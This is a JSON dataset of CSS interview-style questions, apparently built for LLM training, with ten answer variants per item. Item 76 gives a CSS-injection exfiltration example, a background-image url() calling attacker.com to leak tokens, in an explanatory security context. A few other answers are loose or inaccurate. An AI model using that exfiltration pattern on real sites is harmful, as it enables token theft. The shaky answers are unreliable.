{
    "dataset": "CSS_QA_DB",
    "version": "1.0",
    "generated_for": "LLM_training_and_retrieval",
    "parts": [
        {
            "part_id": "Part_8",
            "questions": [
                {
                    "id": 71,
                    "topic": "CSS Logic",
                    "difficulty": "Intermediate",
                    "question": "What is the correct order for link pseudo-classes, and why does it matter?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "Link, Visited, Hover, Active (LVHA)."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "The order is **L**ink, **V**isited, **H**over, **A**ctive. This is strictly enforced by the Cascade. If you define `:hover` before `:link`, the specific rules of `:link` might override `:hover` due to equal specificity, meaning the hover effect will simply never show."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "Cascading order dependency. All have the same specificity (0-1-0). Therefore, the last defined rule wins. `:active` must override `:hover`, which must override `:link/:visited`. Mnemonic: **L**o**V**e **H**ate."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "Link, Visited, Hover, Active."
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "Think of it like dressing. First you exist (Link), then you go places (Visited), then someone touches you (Hover), then you react (Active)."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "LVHA (Love Hate)."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "Many junior developers lose hours debugging why their 'active' state isn't working, only to find it defined before 'hover'."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "Remember the word LOVE and HATE. L-V-H-A."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "`test:focus` usually goes between visited and hover, or along with hover."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "ORDER MATTERS: Love Hate (LVHA) - Link, Visited, Hover, Active."
                        }
                    ]
                },
                {
                    "id": 72,
                    "topic": "Accessibility",
                    "difficulty": "Intermediate",
                    "question": "Why is setting `outline: none` on focusable elements considered a bad practice?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "It removes the visual indicator for keyboard users, making the site unusable for them."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "Removing the outline destroys accessibility for users navigating via Keyboard (Tab key). They lose track of which element is focused. If you remove the default outline, you **must** replace it with a custom focus style (e.g., `border`, `box-shadow`)."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "Violates WCAG 2.1 Criteria 2.4.7 (Focus Visible). Always provide a fallback `box-shadow` or `border` styling if `outline: none` is applied."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "It ruins accessibility for keyboard users."
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "It's like turning off the mouse cursor. You can move the mouse, but you have no idea what you are about to click."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "Hides focus state from keyboard users."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "The pseudo-class `:focus-visible` is the modern solution. It allows you to remove the outline for mouse clicks but keep it for keyboard tabs."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "If you do this, people using the Tab key can't see where they are on the page."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "Bootstrap and other frameworks use `box-shadow` rings to replace the native ugly outline."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "Never do outline: none without providing an alternative focus style."
                        }
                    ]
                },
                {
                    "id": 73,
                    "topic": "Forms",
                    "difficulty": "Easy",
                    "question": "Which property prevents a user from resizing a `<textarea>`?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "`resize: none;`"
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "The `resize` property controls if and how an element can be resized by the user. `resize: none` disables the drag handle. `resize: vertical` allows only height adjustment."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "Property: `resize`. Values: `none`, `both`, `horizontal`, `vertical`. Applies to elements with `overflow` other than visible (usually textareas)."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "resize: none;"
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "It locks the window size."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "Disable built-in drag handle."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "Disabling resize is common in fixed layouts where a large textarea would break the design flow."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "It removes the little grip in the bottom corner so you can't stretch the box."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "Usually you want `resize: vertical` so users can type long essays, but standard design forbids breaking the width."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "resize: none;"
                        }
                    ]
                },
                {
                    "id": 74,
                    "topic": "Security",
                    "difficulty": "Advanced",
                    "question": "How is CSS related to 'Clickjacking' attacks?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "Hackers use transparent CSS overlays (opacity: 0) to trick users into clicking hidden buttons."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "Clickjacking (UI Redressing) involves placing an invisible iframe (`opacity: 0`) over a legitimate looking button. When the user clicks the visible button, they are actually clicking the hidden iframe (e.g., 'Delete Account'). CSS makes the attack possible, but CSS alone cannot prevent it (requires HTTP Headers like X-Frame-Options)."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "The attack relies on `z-index`, `position: absolute`, and `opacity: 0`. The defense is strictly server-side (CSP: frame-ancestors, X-Frame-Options)."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "Hackers use opacity: 0 to create invisible clickable layers."
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "It's like putting a clear sheet of glass over a painting. You think you are touching the painting, but you are putting fingerprints on the glass."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "Invisible overlays (`opacity: 0`) capture clicks."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "`pointer-events: none` on the iframe *could* stop it, but the attacker controls the CSS of the iframe container, so the victim site can't easily defend itself via CSS."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "Bad guys make a clear button on top of a fake button. You click the clear one by mistake."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "Frame-busting scripts used to be the CSS/JS fix (`if (top != self) ...`), but modern browsers discourage them."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "Clickjacking uses CSS to hide the target UI element or overlay a lure UI element."
                        }
                    ]
                },
                {
                    "id": 75,
                    "topic": "Security",
                    "difficulty": "Advanced",
                    "question": "Why browser vendors restrict the styles available to the `:visited` pseudo-class?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "To prevent websites from stealing your browsing history."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "In the past, sites could use JS `getComputedStyle` to check if a link was purple (`:visited`), effectively reading your history. Modern browsers restrict `:visited` changes to only color/column-rule-color and lie to `getComputedStyle` (returning the unvisited color) to plug this privacy leak."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "Prevention of History Sniffing attacks. Only properties that don't affect layout (opacity/layout changes are banned) can be used. Timing attacks are also mitigated."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "To prevent history sniffing (privacy violation)."
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "It's like looking at someone's passport stamps. The browser hides the stamps so websites don't know where you've been."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "Prevents checking URL history via color sniffing."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "You can't even maintain `background-image` on visited links anymore. It forces a very strict subset of styling."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "Websites used to be able to spy on where you've been by checking link colors. Browsers stopped that."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "Technically, the browser still paints the visited color visually, but returns the 'Link' color to the JS engine."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "To prevent websites from knowing which sites a user has visited (History Sniffing)."
                        }
                    ]
                },
                {
                    "id": 76,
                    "topic": "Security",
                    "difficulty": "Intermediate",
                    "question": "What is the security risk of allowing users to input raw CSS (e.g., in a profile customization)?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "They could trigger external requests or deface the execution context."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "Unclean CSS allows 'CSS Injection'. Attackers can set `background-image: url('attacker.com/log?key=...')` inside attribute selectors to exfiltrate data (like CSRF tokens) character by character. They can also execute phishing (imitating site login) via `::after` content."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "Data Exfiltration via Attribute Selectors + Background Requests. Phishing via Content Injection. Denial of Service (DoS) via complex recalc styles."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "CSS Injection leading to data exfiltration or phishing."
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "If you let someone paint your house, they might paint a fake door that leads to a pit, or write their phone number on the wall."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "Background-image calls can steal data."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "This is why `style` tags are usually blocked by Content Security Policy (CSP)."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "They can make the website load a picture from a bad hacker server, which tells the hacker you are there."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "Keylogging is theoretically possible in CSS using attribute selectors on value-changing inputs."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "CSS can be used to exfiltrate sensitive data or deface the application."
                        }
                    ]
                },
                {
                    "id": 77,
                    "topic": "Security",
                    "difficulty": "Intermediate",
                    "question": "What is the purpose of `user-select: none`?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "It prevents the user from highlighting or selecting text."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "It stops the user from selecting text (and thus copying it). It is often used for UI elements like tabs or buttons where text selection feels like a bug. It is NOT a security feature (users can still view source)."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "Controls usage of the Selection API for the element. Values: `auto`, `none`, `text`, `all`."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "Prevents text selection."
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "It puts the text behind glass. You can read it, but you can't grab it."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "Disables text highlighting/copying."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "Often used on Custom Buttons to prevent the double-click-highlight effect."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "It makes it so you can't highlight the words with your mouse."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "Use `user-select: all` for code snippets to let users select the whole block with one click."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "Controls whether the user can select text."
                        }
                    ]
                },
                {
                    "id": 78,
                    "topic": "Security",
                    "difficulty": "Easy",
                    "question": "What happens if you use `pointer-events: none` on a transparent overlay?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "Clicks pass through it to the element underneath."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "The element becomes 'permeable' to mouse interaction. Clicks, hovers, and drag events pass right through it to the element below. It's useful for custom cursors or overlays that shouldn't block interaction."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "The element is never the target of pointer events. The event target is the element below it in the z-order."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "Clicks pass through to elements below."
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "It makes the element a ghost. You can see it, but you put your hand right through it."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "Allows click-through."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "Be careful: The element can still cover content visually, which might be confusing."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "It's like the box has no glass. Your finger touches whatever is inside or behind it."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "However, it does NOT disable keyboard interaction (tabbing) for elements *inside* the none-pointer container."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "The element is never the target of pointer events."
                        }
                    ]
                },
                {
                    "id": 79,
                    "topic": "Styles",
                    "difficulty": "Intermediate",
                    "question": "What is the purpose of a CSS Reset (like `normalize.css`)?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "To make all web browsers render the page essentially the same way."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "Browsers have different default User Agent Styles (e.g., specific margins on body, padding on lists). A Reset strips these away (margin: 0). a Normalize preserves useful defaults (like h1 size) but ensures consistency across browsers."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "Eliminates cross-browser inconsistencies in the default User Agent stylesheet. It provides a clean, predictable baseline for styling."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "To remove inconsistencies between browsers."
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "It's leveling the land before building a house. You don't want bumps from the previous owner."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "Standardizes default browser styles."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "Eric Meyer's Reset was aggressive (everything 0). Normalize.css is gentle (fixes bugs). Modern usage favors Normalize."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "Every browser has different settings. This file resets them all to zero so you start fresh."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "`box-sizing: border-box` is often part of a modern reset."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "Use a reset to remove inconsistencies between browsers."
                        }
                    ]
                },
                {
                    "id": 80,
                    "topic": "Forms",
                    "difficulty": "Intermediate",
                    "question": "How do you style a specific input type, like a password field, differently from a text field?",
                    "answer_variants": [
                        {
                            "variant_id": 1,
                            "style": "simple",
                            "answer": "Use attribute selectors like `input[type='password']`."
                        },
                        {
                            "variant_id": 2,
                            "style": "interview",
                            "answer": "Use the attribute selector `input[type='password']`. This allows you to apply security-specific styles (like specific fonts) or layout adjustments only to password fields without affecting other inputs."
                        },
                        {
                            "variant_id": 3,
                            "style": "technical",
                            "answer": "Attribute selector syntax: `element[attribute='value']`. Specificity is equal to a class (0-1-0)."
                        },
                        {
                            "variant_id": 4,
                            "style": "exam",
                            "answer": "input[type='password'] { ... }"
                        },
                        {
                            "variant_id": 5,
                            "style": "analogy",
                            "answer": "It's picking out only the red M&Ms."
                        },
                        {
                            "variant_id": 6,
                            "style": "one_liner",
                            "answer": "`input[type='password']`."
                        },
                        {
                            "variant_id": 7,
                            "style": "deep_explanation",
                            "answer": "You can target multiple types: `input[type='text'], input[type='email'] { ... }`."
                        },
                        {
                            "variant_id": 8,
                            "style": "beginner_friendly",
                            "answer": "Tell CSS to only look for inputs where the type equals password."
                        },
                        {
                            "variant_id": 9,
                            "style": "advanced",
                            "answer": "`[type='password']` works too (universal), but is slower than `input[type='password']`."
                        },
                        {
                            "variant_id": 10,
                            "style": "strict_definition",
                            "answer": "input[type=text] { ... } syntax is used to select specific input types."
                        }
                    ]
                }
            ]
        }
    ]
}